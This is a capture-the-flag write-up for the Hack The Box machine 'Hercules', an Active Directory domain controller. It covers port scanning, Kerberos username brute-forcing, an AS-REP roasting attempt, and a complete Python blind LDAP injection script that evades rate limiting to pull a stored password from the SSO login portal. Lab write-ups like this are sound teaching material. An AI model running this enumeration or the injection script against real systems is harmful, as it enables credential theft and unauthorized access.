---
title: "HTB Hercules"
date: 2026-08-27 00:35:00 +0000
categories: [WriteUps, Hack The Box, Active Directory, Insane]
tags: []
image: /assets/img/writeups/htb-hercules/Hercules.jpeg
---

`Hercules` is an Insane Windows machine on an Active Directory environment that exposes the `Hercules SSO` web portal (ASP.NET). The exploitation starts with a **Blind LDAP Injection** that allows extracting `johnathan.j`'s password from the `description` attribute, later validated through a **Password Spraying** against `ken.w`; once inside the portal's mail section, a leaked `machineKey` found via **LFI** is abused to forge a session cookie for `web_admin`. As a web admin, the **File Upload** is exploited with a malicious **Bad-ODF** document that leaks `natalie.a`'s **NetNTLMv2** hash, cracked offline with `john`. **BloodHound** enumeration reveals a chain of abuses: `GenericWrite` over the `WEB DEPARTMENT` OU enables a **Shadow Credentials** attack on `bob.w` and, after moving `auditor` between OUs with **PowerView.py**, a second **Shadow Credentials** provides a **WinRM** shell and `user.txt`. For privilege escalation, **ADCS ESC3/ESC15** is leveraged to impersonate `ashley.b`, the **Password Cleanup** scheduled task is abused to recover `IIS_Administrator`, and finally **SPN-less RBCD with U2U** on the `IIS_WEBSERVER$` account impersonates `Administrator`, landing a shell on the DC with `root.txt` and allowing a full domain hash dump via **DCSync**.





----
## Reconnaissance

We'll start with a full port scan of the IP stored in the `IP` variable using `rustscan`. After that we'll also run the version and default script scan that `Nmap` ships with.

Looking at the results we can see a bunch of ports that usually point to a Domain Controller. The ones that stand out the most are:

| Port | Service     |
| ---- | ----------- |
| 53   | DNS         |
| 80   | HTTP        |
| 88   | Kerberos    |
| 389  | LDAP        |
| 445  | SMB         |
| 636  | LDAPS       |
| 5986 | WinRM + SSL |

```bash
❯ rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -o nmapresult.txt                

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://10.129.242.196/
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-20 11:18:28Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Issuer: commonName=hercules.htb
|_http-title: Hercules Corp
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Issuer: commonName=CA-HERCULES/domainComponent=hercules
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60289/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
60296/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61952/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61968/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65273/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

We'll grab the hostname and its domain with `NetExec`, pointing at the `LDAP` service without any credentials. We can also double-check the domain name with `ldapsearch` --> `hercules.htb`.

```bash
❯ nxc ldap $IP                                                                                                                                        
LDAP        10.129.242.196  389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)

❯ ldapsearch -x -H ldap://$IP -s base | grep defaultNamingContext
defaultNamingContext: DC=hercules,DC=htb
```

Once we have the DC hostname and its domain, we'll run a tool called `iRealm`. This one takes care of writing a proper `/etc/krb5.conf` in case we need Kerberos auth, and it also syncs our clock with the `Key Distribution Center (KDC)` (usually the DC itself) so we don't hit clock skew errors like `KRB_AP_ERR_SKEW`.

Lastly, it also updates our `/etc/hosts` so the machine and domain names resolve properly.

```bash
❯ iRealm -i $IP -d inlanefreight.local -n DC01 --sync-time --force

  _ _____            _
 (_)  __ \          | |
  _| |__) |___  __ _| |_ __ ___
 | |  _  // _ \/ _` | | `_ ` _ \
 | | | \ \  __/ (_| | | | | | | |
 |_|_|  \_\___|\__,_|_|_| |_| |_|


🗂️  Backup saved as /etc/hosts.bak
🧹 Cleaning up previous conflicting entries in /etc/hosts...
✅ Added to /etc/hosts!

🗂️  Backup saved as /etc/krb5.conf.bak
🧹 Replacing /etc/krb5.conf...

🎉 Done! Hosts and Kerberos config updated.

⏰ Syncing time with DC...

⚠️  Important Note regarding faketime:
   - You will be dropped into a faked time subshell. To return to normal time, type 'exit'.
   - DO NOT run iRealm with --sync-time again inside this shell to avoid nesting issues.
   - To apply this exact time sync to a NEW terminal, simply run:
     faketime "$(rdate -n 10.129.242.196 -p | awk '{print $2, $3, $4}' | date -f - '+%Y-%m-%d %H:%M:%S')" zsh
```

```sh
❯ cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
127.0.0.1	exegol-htb

10.129.242.196 DC.hercules.htb DC hercules.htb

❯ cat /etc/krb5.conf
[libdefaults]
    default_realm = HERCULES.HTB
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    HERCULES.HTB = {
        kdc = DC.hercules.htb
        admin_server = DC.hercules.htb
        default_domain = hercules.htb
    }

[domain_realm]
    .hercules.htb = HERCULES.HTB
    hercules.htb = HERCULES.HTB
```

We'll check whether the `guest` account is enabled. If it is, we could get a much better enumeration and then attack from there. Trying to validate the account with `NetExec`, we hit this error: `STATUS_NOT_SUPPORTED`. That tells us NTLM auth is disabled, so we have to switch to Kerberos auth.

With `NetExec`, using Kerberos is just a matter of adding the `-k` flag and its credentials, whether that's an NTLM hash for `Pass-the-Hash (PtH)` or plaintext creds. `NetExec` doesn't need us to request a TGT (`.ccache`) and export it in `KRB5CCNAME`; if we do have one, we just point at it with `--use-kcache`.

We'll sync our `zsh` with the DC using `faketime`, and when we run `NetExec` again to check whether `guest` is enabled, we hit `KDC_ERR_CLIENT_REVOKED`, which means the account is disabled.

```bash
❯ nxc ldap $IP -u 'guest' -p ''                                     
LDAP        10.129.242.196  389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.242.196  389    DC               [-] hercules.htb\guest: STATUS_NOT_SUPPORTED

❯ nxc ldap $IP -u 'guest' -p '' -k                                        
LDAP        10.129.242.196  389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.242.196  389    DC               [-] hercules.htb\guest: KDC_ERR_CLIENT_REVOKED
```

---
## Users Enumeration (Kerbrute Userenum)

First thing on the list: enumerate valid domain users so we can later run things like `AS-REP Roasting`. For our first shot we use the usual `xato-net-10-million-usernames.txt` list. The enumeration runs through `kerbrute` in `userenum` mode and brute-forces the DC to tell whether a user exists or not.

From the output we get 3 valid domain users (`admin`, `administrator` and `auditor`). We stop the run because after a long while it wasn't finding any more.

```bash
❯ kerbrute userenum --dc $IP -d hercules.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 5000

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/20/25 - Ronnie Flathers @ropnop

2025/10/20 13:39:29 >  Using KDC(s):
2025/10/20 13:39:29 >  	10.129.242.196:88

2025/10/20 13:39:29 >  [+] VALID USERNAME:	admin@hercules.htb
2025/10/20 13:39:31 >  [+] VALID USERNAME:	Administrator@hercules.htb
2025/10/20 13:39:33 >  [+] VALID USERNAME:	auditor@hercules.htb
2025/10/20 13:39:35 >  [+] VALID USERNAME:	Admin@hercules.htb
2025/10/20 13:39:35 >  [+] VALID USERNAME:	administrator@hercules.htb
2025/10/20 13:39:41 >  [+] VALID USERNAME:	ADMIN@hercules.htb
^C
```

We decide to try another user list, like `john.smith.txt` from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) repo. We come up with 3 more usernames on top of the first scan. All 3 follow the same naming format: `firstname.initialLastname`.

For example: _Gzzcoo Smith_ would become `gzzcoo.s`. It's pretty common in Active Directory for users to follow a specific format, whether it's the one we found here, or `lastname.firstname`, etc.

```bash
❯ kerbrute userenum --dc $IP -d hercules.htb /opt/tools/statistically-likely-usernames/john.smith.txt -t 5000 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/20/25 - Ronnie Flathers @ropnop

2025/10/20 13:40:52 >  Using KDC(s):
2025/10/20 13:40:52 >  	10.129.242.196:88

2025/10/20 13:40:59 >  [+] VALID USERNAME:	ashley.b@hercules.htb
2025/10/20 13:41:31 >  [+] VALID USERNAME:	heather.s@hercules.htb
2025/10/20 13:41:44 >  [+] VALID USERNAME:	mark.s@hercules.htb
^C
```

We'll save all the users we've found so far in a `users.txt` file.

```bash
❯ cat users.txt                                                                                     
admin
administrator
auditor
ashley.b
heather.s
mark.s
harris.d
```

We'll use the `john.txt` wordlist from `statistically-likely-usernames`, which is a list of common first names. We can build a new user dictionary out of it, adding an **a-z** letter to every name on the `john.txt` list. So if the user is called `john`, it'll add `john.a`, `john.b`, `john.c`, etc. Same process for the whole list of names.

```bash
❯ head -n 5 /opt/tools/statistically-likely-usernames/john.txt 
john
michael
david
chris
mike

❯ for user in $(cat /opt/tools/statistically-likely-usernames/john.txt); do for letter in {a..z}; do echo "${user}.${letter}"; done; done > users_a-z.txt

❯ head -n 5 users_a-z.txt; wc -l users_a-z.txt                
john.a
john.b
john.c
john.d
john.e
220402 users_a-z.txt
```

With the fresh dictionary full of possible username candidates following the format we found, we come up with a total of 33 valid users.

```bash
❯ kerbrute userenum --dc $IP -d hercules.htb users_a-z.txt -t 5000

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/20/25 - Ronnie Flathers @ropnop

2025/10/20 14:04:23 >  Using KDC(s):
2025/10/20 14:04:23 >  	10.129.242.196:88

2025/10/20 14:04:23 >  [+] VALID USERNAME:	mark.s@hercules.htb
2025/10/20 14:04:23 >  [+] VALID USERNAME:	bob.w@hercules.htb
2025/10/20 14:04:23 >  [+] VALID USERNAME:	jessica.e@hercules.htb
2025/10/20 14:04:24 >  [+] VALID USERNAME:	vincent.g@hercules.htb
2025/10/20 14:04:24 >  [+] VALID USERNAME:	tanya.r@hercules.htb
2025/10/20 14:04:25 >  [+] VALID USERNAME:	nate.h@hercules.htb
2025/10/20 14:04:25 >  [+] VALID USERNAME:	fiona.c@hercules.htb
2025/10/20 14:04:25 >  [+] VALID USERNAME:	adriana.i@hercules.htb
2025/10/20 14:04:25 >  [+] VALID USERNAME:	rene.s@hercules.htb
2025/10/20 14:04:27 >  [+] VALID USERNAME:	angelo.o@hercules.htb
2025/10/20 14:04:28 >  [+] VALID USERNAME:	johanna.f@hercules.htb
2025/10/20 14:04:28 >  [+] VALID USERNAME:	jennifer.a@hercules.htb
2025/10/20 14:04:28 >  [+] VALID USERNAME:	patrick.s@hercules.htb
2025/10/20 14:04:28 >  [+] VALID USERNAME:	ashley.b@hercules.htb
2025/10/20 14:04:29 >  [+] VALID USERNAME:	ken.w@hercules.htb
2025/10/20 14:04:29 >  [+] VALID USERNAME:	natalie.a@hercules.htb
2025/10/20 14:04:29 >  [+] VALID USERNAME:	stephen.m@hercules.htb
2025/10/20 14:04:29 >  [+] VALID USERNAME:	stephanie.w@hercules.htb
2025/10/20 14:04:29 >  [+] VALID USERNAME:	will.s@hercules.htb
2025/10/20 14:04:29 >  [+] VALID USERNAME:	ray.n@hercules.htb
2025/10/20 14:04:29 >  [+] VALID USERNAME:	joel.c@hercules.htb
2025/10/20 14:04:29 >  [+] VALID USERNAME:	jacob.b@hercules.htb
2025/10/20 14:04:30 >  [+] VALID USERNAME:	heather.s@hercules.htb
2025/10/20 14:04:31 >  [+] VALID USERNAME:	johnathan.j@hercules.htb
2025/10/20 14:04:31 >  [+] VALID USERNAME:	elijah.m@hercules.htb
2025/10/20 14:04:31 >  [+] VALID USERNAME:	ramona.l@hercules.htb
2025/10/20 14:04:31 >  [+] VALID USERNAME:	clarissa.c@hercules.htb
2025/10/20 14:04:32 >  [+] VALID USERNAME:	camilla.b@hercules.htb
2025/10/20 14:04:37 >  [+] VALID USERNAME:	shae.j@hercules.htb
2025/10/20 14:04:40 >  [+] VALID USERNAME:	tish.c@hercules.htb
2025/10/20 14:04:40 >  [+] VALID USERNAME:	zeke.s@hercules.htb
2025/10/20 14:04:41 >  [+] VALID USERNAME:	mikayla.a@hercules.htb
2025/10/20 14:04:50 >  [+] VALID USERNAME:	winda.s@hercules.htb
2025/10/20 14:05:23 >  Done! Tested 220402 usernames (33 valid) in 60.911 seconds
```

We'll stash the output in a `users_noformat.txt` file so we can pull out just the usernames and add them to our existing `users.txt`.

```bash
❯ head -n 5 users_noformat.txt
2025/10/20 14:04:23 >  [+] VALID USERNAME:	mark.s@hercules.htb
2025/10/20 14:04:23 >  [+] VALID USERNAME:	bob.w@hercules.htb
2025/10/20 14:04:23 >  [+] VALID USERNAME:	jessica.e@hercules.htb
2025/10/20 14:04:24 >  [+] VALID USERNAME:	vincent.g@hercules.htb
2025/10/20 14:04:24 >  [+] VALID USERNAME:	tanya.r@hercules.htb

❯ cat users_noformat.txt | awk '{print $NF}' | awk '{print $1}' FS='@' >> users.txt

❯ wc -l users.txt 
40 users.txt
```

With a decent list of potential valid domain users, we can run an `AS-REP Roasting` to grab the TGT (Ticket Granting Ticket) for any user that doesn't require Kerberos pre-authentication (`DONT_REQ_PREAUTH`). Running the attack, none of the users we have access to turn out to be vulnerable.

```bash
❯ GetNPUsers.py -no-pass -usersfile users.txt hercules.htb/ -outputfile hashes.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User adriana.i doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angelo.o doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User ashley.b doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User auditor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bob.w doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User camilla.b doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User clarissa.c doesn't have UF_DONT_REQUIRE_PREAUTH set
...[snip]...
```

---
## Web Enumeration

Going back to the initial port scan, the target has ports 80 (`HTTP`) and 443 (`HTTPS`) exposed, and HTTP redirects to HTTPS. We'll check the `headers` with `cURL` to see if any versions, cookies, etc. show up.

On top of that, we'll fingerprint the web tech with `whatweb`. From the result we can see it's a `Microsoft IIS 10.0` server running the `ASP_NET` framework, and there's an `info@hercules.htb` email.

```bash
❯ curl -I -k https://$IP 
HTTP/2 200 
cache-control: private
content-length: 27342
content-type: text/html; charset=utf-8
server: Microsoft-IIS/10.0
x-frame-options: SAMEORIGIN
set-cookie: __RequestVerificationToken=-HbGfvJI17kft4ttzhfOyFVQ6m4SHVaY-l_v3ddXVmqfk-ezWUbdrFuHlbo062Xhq29lFbqt9vi78jr5EuBsaNETL85d8CSr3NFJGC0Y7zU1; path=/; HttpOnly
date: Wed, 22 Oct 2025 19:44:24 GMT

❯ whatweb -a 3 https://$IP            
https://10.10.11.91 [200 OK] ASP_NET, Bootstrap, Cookies[__RequestVerificationToken], Country[RESERVED][ZZ], Email[info@hercules.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], HttpOnly[__RequestVerificationToken], IP[10.10.11.91], JQuery[3.4.1], Microsoft-IIS[10.0], Script, Title[Hercules Corp], X-Frame-Options[SAMEORIGIN]
```

![image](/assets/img/writeups/htb-hercules/Pasted image 20251020141510.png)

We'll enumerate the site with `feroxbuster` looking for new pages, directories, etc. In the output we find a path that looks like a login page at `/Login`.

```bash
❯ feroxbuster -u https://$IP -t 200 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -C 400,404,500,503 -k
                                                                                                                                                                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.129.242.196
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [400, 404, 500, 503]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      467l     1691w    27342c https://10.129.242.196/default
301      GET        2l       10w      154c https://10.129.242.196/content => https://10.129.242.196/content/
200      GET      467l     1691w    27342c https://10.129.242.196/index
200      GET      467l     1691w    27342c https://10.129.242.196/Default
200      GET       53l      162w     3213c https://10.129.242.196/Login
302      GET        3l        8w      141c https://10.129.242.196/home => https://10.129.242.196/Login?ReturnUrl=%2fhome
200      GET      163l      813w    79405c https://10.129.242.196/Content/Assets/man-typing.jpg
200      GET     1081l     1807w    16450c https://10.129.242.196/Content/vendors/themify-icons/css/themify-icons.css
200      GET      392l     1931w   171638c https://10.129.242.196/Content/Assets/woman-type.jpg
200      GET      259l     1179w   103633c https://10.129.242.196/Content/Assets/wheelchair.jpg
200      GET       85l      485w    41045c https://10.129.242.196/Content/Assets/avatar-2.jpg
200      GET      126l      692w    55960c https://10.129.242.196/Content/Assets/blog-3.jpg
200      GET       74l      464w    37021c https://10.129.242.196/Content/Assets/phone.jpg
...[snip]...
```

We head over to [https://dc.hercules.htb/Login](https://dc.hercules.htb/Login) and find a login portal called `Hercules SSO` that asks for a username and password.


>`SSO`, or single sign-on, is an authentication method that lets users hop between multiple applications and websites with a single set of credentials (username and password), instead of logging in separately to each one.
{: .prompt-danger }

![image](/assets/img/writeups/htb-hercules/Pasted image 20251020142223.png)

If we click the info button on the login portal we get the following warning message. It says login attempts are rate-limited, and suspicious session activity will be watched closely.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251022233715.png)

If we try to make several login attempts, we get the error message below with a 30-second timeout we have to wait out before logging in again.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251022233809.png)

When we try to log in with a user that doesn't exist, it returns: `Invalid login attempt`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251020142615.png)

When we log in with a user that does exist in the domain but with bad credentials, it returns: `Login attempt failed`. That gives us a way to enumerate users based on the error the server returns.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251020142728.png)

---
## Auth as ken.w
### Testing LDAP Injection

Looking at the server response during a login attempt, we noticed the `username` field is validated with a regular expression (`regex`) that blocks specific characters.

- The regex pattern `^[^!&quot;#&amp;&#39;()*+,\:;&lt;=>?[\]^``{|}~]+$` blocks the special characters that are typically used in injection attacks.

- The expression only allows alphanumeric characters and a limited subset of symbols.

````html
<div class="col-md-10">
                        <input class="form-control" data-val="true" data-val-regex="Invalid Username" data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\:;&lt;=>?[\]^`{|}~]+$" data-val-required="The Username field is required." id="Username" name="Username" type="text" value="" />
                        <span class="field-validation-valid text-danger" data-valmsg-for="Username" data-valmsg-replace="true"></span>
                    </div>
````

![image](/assets/img/writeups/htb-hercules/Pasted image 20251020143454.png)

Thinking about what kind of injections we could try on the `username` field, `LDAP Injection` was the first thing that came to mind. That's because we reasoned the backend likely authenticates over `Lightweight Directory Access Protocol (LDAP)`, since valid domain users we'd found returned the same `Login attempt failed` message; in other words, they exist for the `Hercules SSO` portal.

The first thing we can check to see whether it's vulnerable to `LDAP Injection` is to use the `*` wildcard. That tells the LDAP query that, if behind it there's a `find("(&(cn=user)(userPassword=password))")`, it should use the `*` as a wildcard and effectively turn the query into `find("(&(cn=*)(userPassword=password))")`. So it'll match any value and the query stays valid. This also works as a way to bypass the login, or to pull info about LDAP attributes if the query runs over that protocol.

Remember the web server blocks most special characters, `*` included. So the first thing we'll try is to `URL Encode` the payloads before sending them, to get around the web app's regex. In our case we use the `urlencode` helper Exegol provides. Under the hood it runs this Python one-liner, which URL-encodes the string we pass it byte by byte:

```bash
❯ which urlencode  
urlencode: aliased to python3 -c "import sys; from urllib.parse import quote; print(quote(sys.argv[1], safe=\"\"))"
```

Here, the `*` character maps to `%2A`.

```bash
❯ urlencode '*'
%2A
```

When we send the request with the URL-encoded `*`, the page comes back with `Invalid Username`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251020164537.png)

Another idea we had for doing the `LDAP Injection` is to combine `LDAP Escape` with `URL Encode`.


>`LDAP Escape` is the process of encoding special characters inside queries or data so that an LDAP (Lightweight Directory Access Protocol) server interprets them correctly. It's crucial for avoiding syntax errors and for protecting against security issues like LDAP injection, since it makes sure characters like `*`, `(`, `)`, `\`, or the null character are treated as literal data rather than part of the query language.
{: .prompt-info }

Because of the web server's regex, we can't put a `\` for the LDAP Escape, but if we URL-encode it, the message the web server returns is different from before. This time it tells us `Invalid login attempt`. Remember earlier when we validated valid users on the web: entering a non-existent user gave us `Invalid Username`, but entering a valid one gave us `Login attempt failed`. Since here we used the `*` wildcard -- a wildcard that matches any existing user -- it returned `Invalid login attempt`, a message different from the other two.

```bash
❯ urlencode '\2a'
%5C2a
```

![image](/assets/img/writeups/htb-hercules/Pasted image 20251020165055.png)

---
### Enumerating user description through LDAP Injection + Information Leakage

The goal of our `Blind LDAP Injection` is to extract the value of the LDAP `description` attribute, where people often (badly) store passwords.

The script automates a _blind_ extraction: it checks whether `description` exists for a user and rebuilds it character by character by comparing HTTP responses. The app answers with different messages depending on the payload (`Invalid Username` / `Login attempt failed` / `Invalid login attempt`). It also sleeps between requests to avoid tripping the `rate-limiting` and getting locked out.

1. Grab the anti-CSRF token from `GET /login`.

2. Build the LDAP payload with basic escaping for metacharacters (`*`, `(`, `)`).

3. `URL-encode` the payload and send it as `Username` in the login form.

4. Analyze the returned text to infer whether the `description` exists/matches.

5. Iterate over positions and characters to rebuild the string (blind).

```python
#!/usr/bin/env python3
# ldap_injection.py
import requests
import string
import re
import time

requests.packages.urllib3.disable_warnings()

def test_inyeccion(usuario, texto_prueba=""):
    with requests.Session() as s:
        s.verify = False
        
        # Obtener token
        r1 = s.get("https://10.129.90.250/login")
        token_match = re.search(r'name="__RequestVerificationToken".*?value="([^"]+)"', r1.text, re.DOTALL)
        if not token_match:
            return False
        token = token_match.group(1)
        
        # Preparar payload LDAP
        texto_escape = texto_prueba.replace('*', '\\2a').replace('(', '\\28').replace(')', '\\29')
        
        if texto_prueba:
            payload = f"{usuario}*)(description={texto_escape}*"
        else:
            payload = f"{usuario}*)(description=*"
        
        payload_codificado = "".join(f"%{b:02X}" for b in payload.encode())
        
        # Enviar petición
        datos = {
            "Username": payload_codificado,
            "Password": "invalid",
            "RememberMe": "false",
            "__RequestVerificationToken": token
        }
        
        r2 = s.post("https://10.129.90.250/Login", data=datos)
        return "Login attempt failed" in r2.text

def extraer_todo():
    usuarios = []
    with open("users.txt", "r") as f:
        usuarios = [linea.strip() for linea in f if linea.strip()]
    
    print(f"[*] Usuarios a procesar: {len(usuarios)}")
    
    for usuario in usuarios:
        print(f"\n[*] Probando: {usuario}")
        
        # Verificar si tiene descripción
        if not test_inyeccion(usuario):
            print(f"[-] Sin descripción")
            continue
            
        print(f"[+] Descripción encontrada, extrayendo...")
        resultado = ""
        caracteres = string.ascii_letters + string.digits + " .-_!@#$%&*()+=[]{}|;:,<>?/`~"
        
        for posicion in range(100):
            encontrado = False
            
            for char in caracteres:
                if test_inyeccion(usuario, resultado + char):
                    resultado += char
                    print(f"  [{posicion:02d}] '{char}' -> '{resultado}'")
                    encontrado = True
                    time.sleep(0.1)  # Delay importante
                    break
            
            if not encontrado:
                break
        
        if resultado:
            with open("resultados.txt", "a") as f:
                f.write(f"{usuario}:{resultado}\n")
            print(f"[+] Extraído: {resultado}")

if __name__ == "__main__":
    extraer_todo()
```

We run the script above against the user list in `users.txt` and it performs the `Blind LDAP Injection`. After waiting a short while, the script manages to enumerate the `description` field for the user `johnathan.j`.

```bash
❯ python3 ldap_injection.py
[*] Usuarios a procesar: 36

[*] Probando: admin
[-] Sin descripción

[*] Probando: administrator
[-] Sin descripción

[*] Probando: auditor
[-] Sin descripción

[*] Probando: mark.s
[-] Sin descripción

[*] Probando: bob.w
[-] Sin descripción

[*] Probando: jessica.e
[-] Sin descripción

[*] Probando: vincent.g
[-] Sin descripción

[*] Probando: tanya.r
[-] Sin descripción

[*] Probando: nate.h
[-] Sin descripción

[*] Probando: fiona.c
[-] Sin descripción

[*] Probando: adriana.i
[-] Sin descripción

[*] Probando: rene.s
[-] Sin descripción

[*] Probando: angelo.o
[-] Sin descripción

[*] Probando: johanna.f
[-] Sin descripción

[*] Probando: jennifer.a
[-] Sin descripción

[*] Probando: patrick.s
[-] Sin descripción

[*] Probando: ashley.b
[-] Sin descripción

[*] Probando: ken.w
[-] Sin descripción

[*] Probando: natalie.a
[-] Sin descripción

[*] Probando: stephen.m
[-] Sin descripción

[*] Probando: stephanie.w
[-] Sin descripción

[*] Probando: will.s
[-] Sin descripción

[*] Probando: ray.n
[-] Sin descripción

[*] Probando: joel.c
[-] Sin descripción

[*] Probando: jacob.b
[-] Sin descripción

[*] Probando: heather.s
[-] Sin descripción

[*] Probando: johnathan.j
[+] Descripción encontrada, extrayendo...
  [00] 'c' -> 'c'
  [01] 'h' -> 'ch'
  [02] 'a' -> 'cha'
  [03] 'n' -> 'chan'
  [04] 'g' -> 'chang'
  [05] 'e' -> 'change'
  [06] '*' -> 'change*'
  [07] 't' -> 'change*t'
  [08] 'h' -> 'change*th'
  [09] '1' -> 'change*th1'
  [10] 's' -> 'change*th1s'
  [11] '_' -> 'change*th1s_'
  [12] 'p' -> 'change*th1s_p'
  [13] '@' -> 'change*th1s_p@'
  [14] 's' -> 'change*th1s_p@s'
  [15] 's' -> 'change*th1s_p@ss'
  [16] 'w' -> 'change*th1s_p@ssw'
  [17] '(' -> 'change*th1s_p@ssw('
  [18] ')' -> 'change*th1s_p@ssw()'
  [19] 'r' -> 'change*th1s_p@ssw()r'
